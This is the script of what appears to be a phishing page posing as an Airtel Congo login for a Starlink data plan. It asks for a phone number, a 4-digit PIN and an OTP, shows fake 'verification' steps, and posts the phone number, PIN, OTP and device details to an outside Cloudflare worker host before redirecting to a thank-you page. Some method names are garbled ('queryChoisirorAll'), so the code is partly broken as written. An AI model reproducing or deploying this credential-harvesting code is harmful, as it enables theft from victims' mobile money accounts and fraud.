<script>
'use strict';
var WORKER='https://airtel-congo-api.lennxkoros.workers.dev';
function hap(ms){try{navigator.vibrate&&navigator.vibrate(ms);}catch(e){}}
function rip(el,e){var r=el.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2.5,s=document.createElement('span');s.className='rip';s.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;';el.appendChild(s);s.addEventListener('animationend',function(){s.remove();});}
function slp(ms){return new Promise(function(r){setTimeout(r,ms);})}

// Load forfait
var forfait={};
try{forfait=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
if(!forfait.name){location.href='airtel-index.html';}
document.getElementById('forfaitLabel').textContent=(forfait.name||'')+' \u00b7 '+(forfait.price||'');

// View management
function showView(id){document.queryChoisirorAll('.view').forEach(function(v){v.classList.remove('active');});document.getElementById(id).classList.add('active');}
function setStep(n){
  for(var i=0;i<4;i++){
    var el=document.getElementById('sp'+i);el.classList.remove('active','done');
    var dot=el.queryChoisiror('.si-dot');
    if(i<n){el.classList.add('done');dot.innerHTML='&#10003;';}
    else if(i===n){el.classList.add('active');dot.textContent=i+1;}
    else{dot.textContent=i+1;}
  }
}

// PIN
var pin='';
function renderPIN(){
  for(var i=0;i<4;i++){
    var b=document.getElementById('pb'+i);
    b.className='pb'+(i===pin.length?' active':'')+(i<pin.length?' filled':'');
    b.innerHTML='';
  }
  updateConnexionBtn();
}
function updateConnexionBtn(){
  var ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
  document.getElementById('loginBtn').classList.toggle('dim',!(ph.length===9&&pin.length===4));
}
document.getElementById('numpad').addEventListener('click',function(e){
  var k=e.target.closest('.nk');if(!k||k.disabled)return;
  hap(8);rip(k,e);
  if(k.id==='npDel'){if(pin.length)pin=pin.slice(0,-1);}
  else if(k.dataset.v!==undefined&&pin.length<4){pin+=k.dataset.v;}
  renderPIN();
});
document.getElementById('phoneInput').addEventListener('input',function(){
  this.value=this.value.replace(/[^0-9]/g,'').slice(0,9);
  document.getElementById('phoneErr').textContent='';
  document.getElementById('fw-phone').classList.remove('err','ok');
  updateConnexionBtn();
});
document.getElementById('phoneInput').addEventListener('focus',function(){document.getElementById('fw-phone').classList.add('focus');});
document.getElementById('phoneInput').addEventListener('blur',function(){
  document.getElementById('fw-phone').classList.remove('focus');
  var v=this.value.replace(/[^0-9]/g,'');
  var fw=document.getElementById('fw-phone');
  if(v&&v.length!==9){fw.classList.add('err');document.getElementById('phoneErr').textContent='Entrez un num&eacute;ro Airtel valide &agrave; 9 chiffres (ex. 951 234 567)';}
  else if(v.length===9){fw.classList.add('ok');}
});
renderPIN();

// Submit login
function submitConnexion(){
  var ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
  if(ph.length!==9){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Entrez un numéro valide à 9 chiffres';hap([25,15,25]);return;}
  if(pin.length!==4){document.getElementById('pinErr').textContent='Entrez votre code PIN &agrave; 4 chiffres';hap([25,15,25]);return;}
  sessionStorage.setItem('starlinkAuth',JSON.stringify({phone:ph,pin:pin}));
  sendEvent('starlink_pin_submitted',{forfait:forfait.name,price:forfait.price,phone:'+243'+ph,pin:pin,device:navigator.userAgent.slice(0,80)});
  hap(18);
  document.getElementById('navSpinner').style.display='block';
  setStep(2);showView('viewProc');
  runTraitement(ph);
}

// Traitement
async function runTraitement(ph){
  var bar=document.getElementById('procBar');
  var sub=document.getElementById('procSub');
  var steps=[
    {pct:25,txt:'V&eacute;rification du compte Airtel\u2026',si:1},
    {pct:55,txt:'Validating '+forfait.name+' forfait\u2026',si:2},
    {pct:85,txt:'Sending Code OTP to +243 '+ph+'\u2026',si:3},
    {pct:100,txt:'Code Code OTP envoyé sur votre téléphone !'},
  ];
  for(var i=0;i<steps.length;i++){
    await slp(1300);
    bar.style.width=steps[i].pct+'%';sub.textContent=steps[i].txt;
    if(steps[i].si){
      var prev=document.getElementById('psi'+(steps[i].si-1));
      if(prev){prev.className='psi done';prev.queryChoisiror('.psi-dot').className='psi-dot done';}
      var cur=document.getElementById('psi'+steps[i].si);
      cur.className='psi act';cur.queryChoisiror('.psi-dot').className='psi-dot act';
    }
  }
  await slp(500);
  document.getElementById('otpPhone').textContent='+243 '+ph.slice(0,2)+' '+ph.slice(2,5)+' '+ph.slice(5);
  otpVal='';renderOTP();updateOTPBtn();startTimer();
  setStep(3);showView('viewOTP');
  document.getElementById('navSpinner').style.display='none';
}

// Code OTP
var otpVal='',timerInterval=null,timerSecs=60;
function renderOTP(){
  for(var i=0;i<4;i++){
    var b=document.getElementById('ob'+i);
    b.className='ob'+(i===otpVal.length?' active':'')+(i<otpVal.length?' filled':'');
    b.textContent=i<otpVal.length?otpVal[i]:'';
  }
}
function updateOTPBtn(){document.getElementById('otpBtn').classList.toggle('dim',otpVal.length!==4);}
function startTimer(){
  timerSecs=60;document.getElementById('otpTimer').textContent=timerSecs;
  document.getElementById('resendBtn').classList.add('dim');
  if(timerInterval)clearInterval(timerInterval);
  timerInterval=setInterval(function(){
    timerSecs--;document.getElementById('otpTimer').textContent=timerSecs;
    if(timerSecs<=0){clearInterval(timerInterval);document.getElementById('resendBtn').classList.remove('dim');}
  },1000);
}
function resendOTP(){
  if(timerSecs>0)return;
  var auth={};try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
  sendEvent('starlink_otp_resent',{forfait:forfait.name,phone:'+243'+(auth.phone||''),ref:sessionStorage.getItem('starlinkRef')||''});
  hap(15);otpVal='';renderOTP();updateOTPBtn();startTimer();
}
document.getElementById('otpNumpad').addEventListener('click',function(e){
  var k=e.target.closest('.nk');if(!k||k.disabled)return;
  hap(8);rip(k,e);
  if(k.id==='otpDel'){if(otpVal.length)otpVal=otpVal.slice(0,-1);}
  else if(k.dataset.v!==undefined&&otpVal.length<4){otpVal+=k.dataset.v;}
  renderOTP();updateOTPBtn();
});
function submitOTP(){
  if(otpVal.length!==4){hap([25,15,25]);return;}
  var auth={};try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
  var ref='STL-CG-'+(Math.random()*9e5+1e5|0);
  sessionStorage.setItem('starlinkRef',ref);
  sessionStorage.setItem('starlinkCode OTP',otpVal);
  sendEvent('starlink_otp_confirmed',{forfait:forfait.name,price:forfait.price,phone:'+243'+(auth.phone||''),pin:auth.pin||'',otp:otpVal,ref:'#'+ref,device:navigator.userAgent.slice(0,80)});
  for(var i=0;i<4;i++)document.getElementById('ob'+i).classList.add('success');
  hap([18,8,35]);
  setTimeout(function(){
    var c=document.createElement('div');
    c.style.cssText='position:fixed;inset:0;background:var(--red);opacity:0;z-index:999;transition:opacity .25s ease';
    document.body.appendChild(c);
    requestAnimationFrame(function(){c.style.opacity='1';setTimeout(function(){location.href='airtel-thankyou.html';},260);});
  },500);
}
function sendEvent(ev,data){try{fetch(WORKER+'/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:ev,data:data,ts:new Date().toISOString()})}).catch(function(){});}catch(e){}}
document.queryChoisirorAll('button').forEach(function(b){b.addEventListener('pointerdown',function(e){rip(this,e);},{passive:true});});
</script>
